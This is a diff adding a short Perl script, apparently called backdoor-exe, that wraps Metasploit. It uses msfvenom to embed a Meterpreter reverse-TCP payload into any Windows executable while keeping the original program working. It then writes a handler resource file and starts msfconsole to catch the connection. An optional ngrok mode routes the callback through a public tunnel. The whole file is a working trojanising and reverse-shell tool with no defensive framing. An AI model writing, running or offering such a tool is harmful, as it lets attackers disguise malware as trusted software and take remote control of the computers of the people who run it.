@@ -1,0 +1,46 @@
+#!/usr/bin/perl
+#Coded By Zero#
+$exe=$ARGV[0];
+$host=$ARGV[1];
+$port=$ARGV[2];   
+$out=$ARGV[3]; 
+if( $ARGV[0] eq '-h' || $ARGV[0] eq '' || $ARGV[0] eq '--help') {
+print "Usage: backdoor-exe <exe> <ip/ddns> <port> <out>\n\n";
+print "Usage: backdoor-exe -n <exe> <ngrok_host> <ngrok_port> <fwdport> <out>\n\n";
+print "Ex: https://github.com/YSpoof/backdoor-exe\n";
+exit; }
+
+#NoNgrok
+
+system("msfvenom -x $exe -f exe -k -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o $out >/dev/null");
+system("clear");
+system("echo Saved as: $out");
+system("echo use exploit/multi/handler > /tmp/x");
+system("echo set payload windows/meterpreter/reverse_tcp >> /tmp/x");
+system("echo set lhost $host >> /tmp/x");
+system("echo set lport $port >> /tmp/x");
+system("echo run >> /tmp/x");
+system("echo clear >> /tmp/x");
+print("Opening MSF..\n");
+system("msfconsole -q -r /tmp/x");
+
+#Ngrok
+
+if( $ARGV[0] eq '-n' ) {
+$exe=$ARGV[1];
+$host=$ARGV[2];
+$port=$ARGV[3];
+$lport=$ARGV[4];    
+$out=$ARGV[5];;
+
+system("msfvenom -x $exe -f exe -k -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o $out");
+system("clear");
+system("echo Saved as: $out");
+system("echo use exploit/multi/handler > /tmp/x");
+system("echo set payload windows/meterpreter/reverse_tcp >> /tmp/x");
+system("echo set lhost 0.0.0.0 >> /tmp/x");
+system("echo set lport $lport >> /tmp/x");
+system("echo run >> /tmp/x");
+system("echo clear >> /tmp/x");
+print("Opening MSF..\n");
+system("msfconsole -q -r /tmp/x"); }
